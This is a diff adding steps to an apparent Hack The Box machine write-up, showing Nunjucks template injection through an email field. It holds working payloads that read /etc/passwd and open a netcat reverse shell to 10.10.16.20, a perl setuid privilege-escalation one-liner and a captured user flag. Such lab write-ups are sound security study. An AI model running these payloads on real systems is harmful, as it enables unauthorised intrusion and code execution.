@@ -85,4 +85,74 @@ gobuster vhost -u host -w wordlists -k
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/63734eda-2187-4acd-8dfc-d3889acce18b)
 
 
-10. 
+10. Did a little outsource about **Nunjucks Template Engine** exploit.
+
+```
+http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine
+```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3e2f4c37-6109-4a83-bada-54e895ef8553)
+
+
+11. But we need to revised a little bit.
+
+> REVISED
+
+```
+{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}@gmail.com
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b9203ea2-0ebb-48f5-ae52-516ac4c9335d)
+
+
+12. Let's spawn reverse shell with our template payload. Here's the full payload:
+
+> PAYLOAD
+
+```
+{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.20 1337 >/tmp/f')\")()}}@gmail.com
+```
+
+#### NOTE:
+
+```
+Use the previous request we sent to repeater then change the JSON email parameter value, it won't work if we tried to catch the request from 0 again.
+```
+
+> RESULT - GOT RCEEEEE
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ab0062ae-ff95-4cd2-a6a5-a4b52f5232ee)
+
+
+> GETTING USER FLAG
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/987824cc-b833-48f5-9811-353167867a9b)
+
+
+## USER FLAG
+
+```
+341e52e2c4724a2da3b7af04a076458b
+```
+
+13. Actually it took me a while to get the root flag, until I realized the capabilities for perl is vulnerable here.
+
+> To check cap --> run --> getcap -r /
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d4661780-cafc-4725-85f5-46c9dae72057)
+
+
+14. To do privesc we can use this --> `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`.
+15. Anyway dunno why it can't.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/845ae0e5-da06-40b3-b928-468cf63c4d40)
+
+
+16. Even to get the root flag still can't.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ab4e90d8-637b-4db4-afb7-816f8dbe28a8)
+
+
+17. Interesting.
